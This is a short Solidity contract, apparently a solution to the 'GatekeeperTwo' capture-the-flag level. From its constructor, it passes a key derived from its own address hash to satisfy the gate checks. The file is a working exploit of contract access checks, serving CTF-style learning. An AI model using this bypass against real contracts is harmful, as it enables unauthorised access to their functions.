// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/14-IGatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(IGatekeeperTwo victimGatekeeperTwo) {
        require(
            victimGatekeeperTwo.enter(
                bytes8(
                    uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                        type(uint64).max
                )
            ),
            "GatekeeperTwo: Wrong res"
        );

        require(
            msg.sender == victimGatekeeperTwo.entrant(),
            "GatekeeperTwo: Attack failed"
        );
    }
}
